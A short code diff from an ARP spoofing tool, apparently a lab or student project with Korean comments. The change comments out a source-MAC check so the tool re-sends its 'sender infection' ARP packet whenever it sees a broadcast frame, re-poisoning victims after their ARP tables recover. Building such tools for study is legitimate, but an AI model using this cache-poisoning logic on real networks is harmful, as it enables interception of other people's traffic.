@@ -147,7 +147,7 @@ int start_spoofing(char*dev ,char* sip , char* tip){
 
                 //When ARP Table Recover
                 else if(Mac(Packet_eth -> ether_dhost)==Mac::broadcastMac()){
-                        if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
+                        //if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
                                 //Sender감염 패킷생성
                                 EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
                                 //패킷 전송
@@ -158,7 +158,7 @@ int start_spoofing(char*dev ,char* sip , char* tip){
 				{
                                         printf("\n+Detecting Arp Recover and re-Infection+\n");
                                 }
-                        }
+                        //}
                 }
                 else{
                         EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
